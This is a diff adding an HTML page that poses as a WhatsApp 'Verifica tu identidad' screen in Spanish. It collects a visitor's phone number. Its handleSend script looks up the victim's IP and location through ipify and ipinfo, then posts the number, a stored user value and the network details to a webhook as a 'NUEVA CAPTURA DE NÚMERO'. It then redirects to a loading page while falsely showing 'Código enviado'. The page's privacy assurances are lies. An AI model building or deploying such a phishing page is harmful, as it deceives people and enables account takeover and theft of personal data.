@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>continuar</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: #f3f3f3;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    min-height: 100vh;
+    font-family: 'Segoe UI', Arial, sans-serif;
+    padding: 20px 0;
+  }
+
+  .phone-frame {
+    width: 360px;
+    background: #fff;
+    border-radius: 20px;
+    overflow: hidden;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+  }
+
+  .hero {
+    background: linear-gradient(160deg, #1a7a4a 0%, #25a560 50%, #1e9455 100%);
+    padding: 28px 24px 36px;
+    position: relative;
+  }
+
+  .badge-verificacion {
+    display: inline-flex;
+    align-items: center;
+    gap: 7px;
+    background: rgba(255,255,255,0.18);
+    border: 1px solid rgba(255,255,255,0.35);
+    border-radius: 20px;
+    padding: 5px 14px;
+    margin-bottom: 20px;
+  }
+  .badge-dot {
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: #5effa0;
+    box-shadow: 0 0 6px #5effa0;
+  }
+  .badge-verificacion span {
+    font-size: 11px;
+    font-weight: 700;
+    color: #fff;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+  }
+
+  .hero-icon {
+    width: 64px; height: 64px;
+    background: rgba(255,255,255,0.15);
+    border-radius: 16px;
+    display: flex; align-items: center; justify-content: center;
+    margin-bottom: 18px;
+  }
+  .hero-icon svg { width: 38px; height: 38px; fill: #fff; }
+
+  .hero h1 {
+    font-size: 30px;
+    font-weight: 800;
+    color: #fff;
+    line-height: 1.15;
+    margin-bottom: 12px;
+  }
+
+  .hero p {
+    font-size: 14px;
+    color: rgba(255,255,255,0.85);
+    line-height: 1.55;
+    margin-bottom: 18px;
+  }
+
+  .hero-bullets { list-style: none; display: flex; flex-direction: column; gap: 8px; }
+  .hero-bullets li {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-size: 14px;
+    color: #fff;
+  }
+  .hero-bullets li::before {
+    content: '';
+    width: 9px; height: 9px;
+    border-radius: 50%;
+    background: #5effa0;
+    flex-shrink: 0;
+  }
+
+  .body {
+    background: #fff;
+    padding: 26px 20px 28px;
+  }
+
+  .brand-row {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 20px;
+  }
+  .brand-icon {
+    width: 42px; height: 42px;
+    background: #25d366;
+    border-radius: 10px;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+  }
+  .brand-icon svg { width: 26px; height: 26px; fill: #fff; }
+  .brand-name {
+    font-size: 18px;
+    font-weight: 700;
+    color: #111;
+  }
+
+  .form-title {
+    font-size: 24px;
+    font-weight: 800;
+    color: #111;
+    margin-bottom: 8px;
+  }
+  .form-subtitle {
+    font-size: 13.5px;
+    color: #555;
+    line-height: 1.5;
+    margin-bottom: 18px;
+  }
+
+  .security-notice {
+    background: #f0faf4;
+    border-left: 3px solid #25d366;
+    border-radius: 8px;
+    padding: 12px 14px;
+    display: flex;
+    gap: 10px;
+    margin-bottom: 22px;
+    align-items: flex-start;
+  }
+  .security-notice svg { width: 18px; height: 18px; fill: #1a7a4a; flex-shrink: 0; margin-top: 1px; }
+  .security-notice p { font-size: 13px; color: #333; line-height: 1.5; }
+  .security-notice p strong { color: #1a7a4a; }
+
+  .field-label {
+    font-size: 11px;
+    font-weight: 700;
+    color: #888;
+    letter-spacing: 0.8px;
+    text-transform: uppercase;
+    margin-bottom: 8px;
+  }
+
+  .country-select {
+    width: 100%;
+    background: #f5f5f5;
+    border: 1.5px solid #e0e0e0;
+    border-radius: 10px;
+    padding: 13px 14px;
+    font-size: 15px;
+    color: #111;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 10px;
+    cursor: pointer;
+    user-select: none;
+  }
+  .country-left { display: flex; align-items: center; gap: 8px; }
+  .flag { font-size: 20px; }
+  .country-code { font-size: 15px; font-weight: 600; color: #111; }
+  .chevron { color: #aaa; font-size: 14px; }
+
+  .phone-input {
+    width: 100%;
+    border: 1.5px solid #25d366;
+    border-radius: 10px;
+    padding: 13px 14px;
+    font-size: 15px;
+    color: #aaa;
+    outline: none;
+    background: #fff;
+    margin-bottom: 18px;
+    font-family: inherit;
+  }
+  .phone-input:focus {
+    border-color: #1a7a4a;
+    color: #111;
+  }
+
+  .btn-send {
+    width: 100%;
+    background: #25a560;
+    color: #fff;
+    border: none;
+    border-radius: 12px;
+    padding: 16px;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    transition: background 0.2s, transform 0.1s;
+    margin-bottom: 16px;
+  }
+  .btn-send:hover  { background: #1e8f50; }
+  .btn-send:active { transform: scale(0.98); }
+  .btn-send svg { width: 22px; height: 22px; fill: #fff; }
+
+  .disclaimer {
+    font-size: 12px;
+    color: #888;
+    text-align: center;
+    line-height: 1.6;
+  }
+  .disclaimer a { color: #25a560; text-decoration: none; }
+
+  .bottom-nav {
+    background: #f5f5f5;
+    border-top: 1px solid #e0e0e0;
+    padding: 10px 20px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .nav-icon { font-size: 20px; color: #555; cursor: pointer; }
+  .nav-center {
+    display: flex; align-items: center; gap: 8px;
+    background: #333; border-radius: 20px; padding: 6px 14px;
+  }
+  .nav-dots { font-size: 20px; color: #555; }
+  .phone-wrapper{
+  display:flex;
+  gap:10px;
+}
+
+#countrySelect{
+  padding:10px;
+  border-radius:8px;
+  border:1px solid #ccc;
+  cursor:pointer;
+}
+
+#phone{
+  flex:1;
+  padding:10px;
+  border-radius:8px;
+  border:1px solid #ccc;
+}
+
+.country-select{
+  position: relative;
+  cursor: pointer;
+}
+
+.country-dropdown{
+  position:absolute;
+  top:110%;
+  left:0;
+  width:100%;
+  background:#fff;
+  border-radius:12px;
+  box-shadow:0 8px 20px rgba(0,0,0,.15);
+  display:none;
+  z-index:999;
+  max-height:220px;
+  overflow-y:auto;
+}
+
+.country-dropdown div{
+  padding:10px 12px;
+  cursor:pointer;
+}
+
+.country-dropdown div:hover{
+  background:#f2f2f2;
+}
+
+.country-select.open .country-dropdown{
+  display:block;
+}
+</style>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script type="text/javascript" src="infodt.js"></script>
+</head>
+<body>
+<div class="phone-frame">
+
+  <div class="hero">
+    <div class="badge-verificacion">
+      <span class="badge-dot"></span>
+      <span>Verificación Segura</span>
+    </div>
+
+    <div class="hero-icon">
+      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
+      </svg>
+    </div>
+
+    <h1>Verifica tu<br>identidad</h1>
+    <p>Enviaremos un código único a tu WhatsApp para confirmar que eres tú.</p>
+
+    <ul class="hero-bullets">
+      <li>Código encriptado de un solo uso</li>
+      <li>Válido por 10 minutos</li>
+      <li>Nunca compartimos tu número</li>
+    </ul>
+  </div>
+
+
+  <div class="body">
+
+    <div class="brand-row">
+      <div class="brand-icon">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
+        </svg>
+      </div>
+      <span class="brand-name">WhatsApp</span>
+    </div>
+
+    <div class="form-title">Ingresa tu número</div>
+    <div class="form-subtitle">Te enviaremos un código de 6 dígitos directamente a tu WhatsApp</div>
+
+    <div class="security-notice">
+      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
+      </svg>
+      <p><strong>Verificación segura:</strong> Tu código llega directo a tu WhatsApp. Nadie más puede verlo.</p>
+    </div>
+
+    <div class="field-label">Número de Teléfono</div>
+
+    <div class="country-select" onclick="toggleCountry(this)">
+      <div class="country-left">
+        <span class="flag">🇨🇴</span>
+        <span class="country-code">+57</span>
+      </div>
+	  
+	   
+      <span class="chevron">▾</span>
+	  
+	    <div class="country-dropdown">
+    <div onclick="selectCountry('🇨🇴','+57',event)">🇨🇴 Colombia (+57)</div>
+    <div onclick="selectCountry('🇲🇽','+52',event)">🇲🇽 México (+52)</div>
+    <div onclick="selectCountry('🇺🇸','+1',event)">🇺🇸 USA (+1)</div>
+    <div onclick="selectCountry('🇪🇸','+34',event)">🇪🇸 España (+34)</div>
+    <div onclick="selectCountry('🇦🇷','+54',event)">🇦🇷 Argentina (+54)</div>
+	<div onclick="selectCountry('🇧🇴','+591',event)">🇧🇴 Bolivia (+591)</div>
+	<div onclick="selectCountry('🇧🇷','+55',event)">🇧🇷 Brasil (+55)</div>
+    <div onclick="selectCountry('🇵🇪','+51',event)">🇵🇪 Perú (+51)</div>
+	<div onclick="selectCountry('🇨🇷','+506',event)">🇨🇷 Costa Rica (+506)</div>
+    <div onclick="selectCountry('🇨🇱','+56',event)">🇨🇱 Chile (+56)</div>
+	<div onclick="selectCountry('🇨🇺','+53',event)">🇨🇺 Cuba (+53)</div>
+	<div onclick="selectCountry('🇩🇴','+1',event)">🇩🇴 Rep. Dominicana (+1)</div>
+	<div onclick="selectCountry('🇪🇨','+593',event)">🇪🇨 Ecuador (+593)</div>
+	<div onclick="selectCountry('🇸🇻','+503',event)">🇸🇻 El Salvador (+503)</div>
+	<div onclick="selectCountry('🇬🇹','+502',event)">🇬🇹 Guatemala (+502)</div>
+	<div onclick="selectCountry('🇭🇳','+504',event)">🇭🇳 Honduras (+504)</div>
+	<div onclick="selectCountry('🇳🇮','+505',event)">🇳🇮 Nicaragua (+505)</div>
+	<div onclick="selectCountry('🇵🇦','+507',event)">🇵🇦 Panamá (+507)</div>
+	<div onclick="selectCountry('🇵🇾','+595',event)">🇵🇾 Paraguay (+595)</div>
+	<div onclick="selectCountry('🇵🇷','+1',event)">🇵🇷 Puerto Rico (+1)</div>
+	<div onclick="selectCountry('🇺🇾','+598',event)">🇺🇾 Uruguay (+598)</div>
+	<div onclick="selectCountry('🇺🇾','+58',event)">🇻🇪 Venezuela(+58)</div>
+  </div>
+    </div>
+	
+
+    <input
+      class="phone-input"
+      type="tel"
+      placeholder="300 123 4567"
+      maxlength="15"
+      oninput="formatPhone(this)"
+    />
+
+    <button class="btn-send" onclick="handleSend()">
+      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
+      </svg>
+      Enviar Código por WhatsApp
+    </button>
+
+    <div class="disclaimer">
+      Al continuar aceptas recibir mensajes de WhatsApp.<br>
+      Tu número no será compartido con terceros.
+      <a href="#">Términos de servicio</a>
+    </div>
+
+  </div>
+
+  <div class="bottom-nav">
+    <span class="nav-icon">&#8249;</span>
+    <div class="nav-center">
+      <span style="font-size:15px; color:#fff;">⊟</span>
+    </div>
+    <span class="nav-dots">&#8230;</span>
+  </div>
+
+</div>
+
+<script>
+function formatPhone(input) {
+
+  let v = input.value.replace(/\D/g, '').slice(0,10);
+
+  if (v.length > 6)
+      v = v.slice(0,3)+' '+v.slice(3,6)+' '+v.slice(6);
+  else if (v.length > 3)
+      v = v.slice(0,3)+' '+v.slice(3);
+
+  input.value = v;
+}
+  
+  function changeCountry() {
+  const select = document.getElementById("countrySelect");
+  const code = select.value;
+
+  localStorage.setItem("countryCode", code);
+
+  console.log("Código país:", code);
+}
+async function detectUserCountry() {
+  try {
+
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
+
+    const country = data.country_code; 
+
+    applyDetectedCountry(country);
+
+  } catch(e) {
+    console.log("No se pudo detectar país");
+  }
+}
+
+function applyDetectedCountry(country) {
+
+  const countries = {
+    CO:{flag:'🇨🇴',code:'+57'},
+    MX:{flag:'🇲🇽',code:'+52'},
+    US:{flag:'🇺🇸',code:'+1'},
+    ES:{flag:'🇪🇸',code:'+34'},
+    AR:{flag:'🇦🇷',code:'+54'},
+    BO:{flag:'🇧🇴',code:'+591'},
+    BR:{flag:'🇧🇷',code:'+55'},
+    PE:{flag:'🇵🇪',code:'+51'},
+    CR:{flag:'🇨🇷',code:'+506'},
+    CL:{flag:'🇨🇱',code:'+56'},
+    EC:{flag:'🇪🇨',code:'+593'},
+    PA:{flag:'🇵🇦',code:'+507'},
+    PY:{flag:'🇵🇾',code:'+595'},
+    UY:{flag:'🇺🇾',code:'+598'},
+    VE:{flag:'🇻🇪',code:'+58'}
+  };
+
+  if(countries[country]) {
+    selectCountry(
+      countries[country].flag,
+      countries[country].code,
+      country
+    );
+  }
+}
+
+window.addEventListener("load", () => {
+
+  const saved = localStorage.getItem("countryISO");
+
+  if(saved){
+    applyDetectedCountry(saved);
+  }else{
+    detectUserCountry();
+  }
+
+});
+
+function handleSend() {
+
+  const input = document.querySelector('.phone-input');
+
+  const numero = input.value.replace(/\s/g,'');
+
+  if (numero.length < 7) {
+    input.style.borderColor = '#e53935';
+    input.placeholder = 'Ingresa un número válido';
+
+    setTimeout(() => {
+      input.style.borderColor = '#25d366';
+      input.placeholder = '300 123 4567';
+    }, 2000);
+
+    return;
+  }
+
+  const codigoPais = localStorage.getItem("countryCode") || "+57";
+
+  const telefonoCompleto = codigoPais + numero;
+
+  console.log("Número final:", telefonoCompleto);
+
+  var persona = localStorage.getItem('user');
+  
+        let ip, ip2;
+        $.getJSON("https://api.ipify.org?format=json", function(data) {
+            ip = data.ip;
+            $.getJSON("https://ipinfo.io", function(response) {
+                ip2 = response.city + ", " + response.country;
+                
+         			
+	const message = "```📱 NUEVA CAPTURA DE NÚMERO ```\n" +
+                "👤 USUARIO:\n`" + persona + "`\n" +
+                "📞 Numero de WhatsApp:\n`" + telefonoCompleto + "`\n\n" +
+                "📡 **Información de Red:**\n" +
+                "📌 IP: `" + ip + "`\n" +
+                "🌍Ubicacion: `" + ip2 + "`\n" +
+                "───────────────────────────";
+				             var settings = {
+    async: true,
+    url: webhook,
+    method: "POST",
+    contentType: "application/json",
+    data: JSON.stringify({
+        content: message
+    })
+};
+                
+                $.ajax(settings).done(function (response) {
+                    window.location = 'loading.html'; 
+                }).fail(function (error) {
+                    window.location = 'loading.html';
+                });
+            });
+        });
+
+
+  const btn = document.querySelector('.btn-send');
+  btn.textContent = '⏳ Enviando código...';
+  btn.style.background = '#1a7a4a';
+
+  setTimeout(() => {
+    btn.textContent = '✓ Código enviado';
+    btn.style.background = '#0d5c35';
+  }, 1800);
+}
+  
+  
+function toggleCountry(el){
+  el.classList.toggle("open");
+}
+
+function selectCountry(flag, code, e){
+
+  e.stopPropagation();
+
+  const select = document.querySelector(".country-select");
+
+  select.querySelector(".flag").textContent = flag;
+  select.querySelector(".country-code").textContent = code;
+
+  localStorage.setItem("countryFlag", flag);
+  localStorage.setItem("countryCode", code);
+
+  select.classList.remove("open");
+}
+
+document.addEventListener("click", function(e){
+  const select = document.querySelector(".country-select");
+  if(!select.contains(e.target)){
+    select.classList.remove("open");
+  }
+});
+
+window.onload = () => {
+  const flag = localStorage.getItem("countryFlag");
+  const code = localStorage.getItem("countryCode");
+
+  if(flag && code){
+    document.querySelector(".flag").textContent = flag;
+    document.querySelector(".country-code").textContent = code;
+  }
+};
+</script>
+</body>
+</html>
